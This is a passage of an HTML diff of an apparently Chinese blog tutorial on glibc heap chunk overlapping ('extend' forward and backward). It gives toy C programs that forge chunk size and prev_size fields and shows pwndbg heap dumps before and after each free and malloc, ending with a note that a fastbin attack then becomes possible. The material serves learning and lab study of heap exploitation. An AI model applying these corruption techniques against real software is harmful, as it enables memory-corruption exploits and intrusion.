0x0000000000000000      0x0000000000000411</span><br><span class="line">0x602090:       0x303a7274705d2a5b      0x0a30313032303678</span><br></pre></td></tr></table></figure></p>
+<h3 id="通过extend后向overlapping"><a href="#通过extend后向overlapping" class="headerlink" title="通过extend后向overlapping"></a>通过extend后向overlapping</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span><br></span>&#123;<br>    <span class="hljs-keyword">void</span> *ptr,*ptr1;<br><br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第1个 0x80 的chunk1</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//分配第2个 0x10 的chunk2</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//分配第3个 0x10 的chunk3</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//分配第4个 0x10 的chunk4    </span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*]ptr:%p\n"</span>,ptr);<br>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x61</span>;<br>    <span class="hljs-built_in">free</span>(ptr);<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*]ptr:%p\n"</span>,ptr1);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>我在第一次分配处下了断点,此时的堆:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs undefined">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x20fe1</span><br>&#125;<br><span class="hljs-number">0x602020</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">135137</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure></p>
+<p>随后分配完全结束时我们再看<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs undefined">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602020</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602040</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602060</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x20f81</span><br>&#125;<br><span class="hljs-number">0x602080</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">135041</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure></p>
+<p>这时:<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">20</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602010</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602050</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602060</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602070</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602080</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000020f81</span><br><span class="hljs-number">0x602090</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure></p>
+<p>随后我们更改了size的大小<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs undefined">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">97</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602060</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x411</span><br>&#125;<br><span class="hljs-number">0x602080</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1041</span>,<br>  fd = <span class="hljs-number">0x303a7274705d2a5b</span>,<br>  bk = <span class="hljs-number">0xa30313032303678</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602490</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134001</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure></p>
+<p>free之后我们可以看到:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs undefined">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">97</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602060</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x411</span><br>&#125;<br><span class="hljs-number">0x602080</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1041</span>,<br>  fd = <span class="hljs-number">0x303a7274705d2a5b</span>,<br>  bk = <span class="hljs-number">0xa30313032303678</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602490</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134001</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure></p>
+<p>再分配一次<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs undefined">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">97</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602060</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x411</span><br>&#125;<br><span class="hljs-number">0x602080</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1041</span>,<br>  fd = <span class="hljs-number">0x303a7274705d2a5b</span>,<br>  bk = <span class="hljs-number">0xa30313032303678</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602490</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134001</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure></p>
+<p>此时<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">20</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000061</span><br><span class="hljs-number">0x602010</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602050</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602060</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602070</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602080</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000411</span><br><span class="hljs-number">0x602090</span>:       <span class="hljs-number">0</span>x303a7274705d2a5b      <span class="hljs-number">0</span>x0a303<span class="hljs-number">13032303678</span><br></code></pre></td></tr></table></figure></p>
 <p>这时就可以进行fastbin attack了</p>
-<h3 id="通过extend进行前向合并"><a href="#通过extend进行前向合并" class="headerlink" title="通过extend进行前向合并"></a>通过extend进行前向合并</h3><p>之前的后向合并都是通过更改size实现的,但extend的前向合并则不一样,但原理是类似的<br>后向合并是通过更改size实现的,而前向合并顾名思义需要我们更改pre_size才行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr1,*ptr2,*ptr3,*ptr4,*ptr5;</span><br><span class="line">    ptr1=malloc(128);//smallbin1</span><br><span class="line">    ptr2=malloc(0x10);//fastbin1</span><br><span class="line">    ptr3=malloc(0x10);//fastbin2</span><br><span class="line">    ptr4=malloc(128);//smallbin2</span><br><span class="line">    malloc(0x10);//防止与top合并</span><br><span class="line">    printf(&quot;[*]ptr1:%p\n&quot;,ptr1);</span><br><span class="line">    printf(&quot;[*]ptr2:%p\n&quot;,ptr2);</span><br><span class="line">    printf(&quot;[*]ptr3:%p\n&quot;,ptr3);</span><br><span class="line">    printf(&quot;[*]ptr4:%p\n&quot;,ptr4);</span><br><span class="line">    free(ptr1);</span><br><span class="line">    *(long long *)((long long)ptr4-0x8)=0x90;//修改pre_inuse域</span><br><span class="line">    *(long long *)((long long)ptr4-0x10)=0xd0;//修改pre_size域</span><br><span class="line">    free(ptr4);//unlink进行前向extend</span><br><span class="line">    ptr5=malloc(0x150);//占位块</span><br><span class="line">    printf(&quot;[*]ptr5:%p\n&quot;,ptr5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>先看程序的运行结果:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">╰─# ./pwn</span><br><span class="line">[*]ptr1:0x10c2010</span><br><span class="line">[*]ptr2:0x10c20a0</span><br><span class="line">[*]ptr3:0x10c20c0</span><br><span class="line">[*]ptr4:0x10c20e0</span><br><span class="line">[*]ptr5:0x10c2010</span><br></pre></td></tr></table></figure></p>
-<p>然后再调试一下,这次我断点下在了第一free的地方<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x602000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 145,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602090 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 33,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x6020b0 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 33,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x91</span><br><span class="line">&#125;</span><br><span class="line">0x6020d0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 145,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602160 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 33,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x411</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>可以看到我们的符合smallbin和fastbin的四个chunk已经分配完成了,然后先free掉ptr1,修改ptr4的pre_inuse和pre_size<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx ptr4-0x10</span><br><span class="line">0x6020d0:       0x00000000000000d0      0x0000000000000090</span><br><span class="line">0x6020e0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6020f0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602100:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602110:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602120:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602130:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602140:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602150:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602160:       0x0000000000000000      0x0000000000000021</span><br></pre></td></tr></table></figure></p>
-<p>这里已经改好了,然后进行free(ptr4),此时的heap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x602000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 353,</span><br><span class="line">  fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;,</span><br><span class="line">  bk = 0x7ffff7dd1b78 &lt;main_arena+88&gt;,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602160 &#123;</span><br><span class="line">  prev_size = 352,</span><br><span class="line">  size = 32,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x411</span><br><span class="line">&#125;</span><br><span class="line">0x602180 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 1041,</span><br><span class="line">  fd = 0x3a347274705d2a5b,</span><br><span class="line">  bk = 0x3065303230367830,</span><br><span class="line">  fd_nextsize = 0xa,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602590 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 133745,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>此时的bins:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure></p>
-<p>然后再分配<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x602000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 353,</span><br><span class="line">  fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;,</span><br><span class="line">  bk = 0x7ffff7dd1b78 &lt;main_arena+88&gt;,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602160 FASTBIN 